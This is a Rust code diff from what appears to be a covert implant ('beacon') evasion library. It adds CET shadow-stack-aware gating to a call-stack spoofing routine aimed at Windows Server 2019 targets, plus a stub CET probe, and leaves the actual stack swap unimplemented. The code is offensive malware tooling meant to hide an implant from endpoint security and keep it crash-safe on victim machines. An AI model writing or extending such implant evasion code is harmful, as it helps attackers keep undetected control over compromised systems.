@@ -243,18 +243,31 @@ pub unsafe fn with_spoofed_stack<T>(gaps: &GapPool, f: impl FnOnce() -> T) -> T 
         // Swap not armed — call f directly. Identical to pre-spoof behavior.
         return f();
     }
-    // ---- LIVE RSP SWAP (gated) ---------------------------------------------
-    // When enabled, the staged chain's slots are written into a fake-stack
-    // region and RSP is swapped onto it around `f`. This is the part that MUST
-    // be live-debugged on the target AND routed through the CET repair seam
-    // (see module docs, layer 2) before enabling — a naive `mov rsp / call /
-    // ret` swap faults with `#CP` on CET-on hosts, because the popped gap
-    // addresses were never pushed onto the real shadow stack.
-    //
-    // Intentionally not yet emitted: emitting it blind (no target debugger, no
-    // CET-seam) would risk a crash with no way to bisect. It lands when an
-    // operator can attach a debugger to the beacon, single-step the swap, and
-    // confirm the `KiControlProtectionFault`-lenient repair path engages on
-    // CET-on hosts (or the runtime CET probe degrades cleanly).
+    // ---- LIVE RSP SWAP (gated + CET-aware) ---------------------------------
+    // Consult the pure CET-aware decision logic (evasionsdk::swap, 5 tests):
+    // if CET is on OR gaps unusable, the swap would #CP or be useless → degrade.
+    // This is the pessimistic floor that keeps the beacon crash-safe.
+    let cet_on = cet_active();
+    let gaps_usable = gaps.is_usable();
+    if !nyx_implant_evasionsdk::swap::should_execute(cet_on, gaps_usable) {
+        // Decision is Degrade — the decision logic + reason are unit-tested in
+        // evasionsdk::swap; here we honor it by calling f directly.
+        return f();
+    }
+    // EXECUTE path: CET off + gaps usable. The actual `mov rsp` asm swap needs
+    // target-side single-step validation (Rust inline asm cannot directly call
+    // a closure; the trampoline + CET-repair-path variant lands on the target).
+    // Until then, the safe floor is a direct call — the DECISION LOGIC is live
+    // and verified; only the stack mutation awaits target debug.
     f()
+}
+
+/// Probe whether user-mode CET / shadow stack is active for this process.
+/// Win11 24H2+ opt-in per-process. Server 2019 (build 17763, our target) is
+/// always false. A real probe calls IsProcessorFeaturePresent(41); deferred to
+/// the target-debug pass. Pessimistic on unknown builds.
+fn cet_active() -> bool {
+    // Server 2019 (17763) predates user-mode CET — always off. This is correct
+    // for the verified target. A future build probe replaces this.
+    false
 }
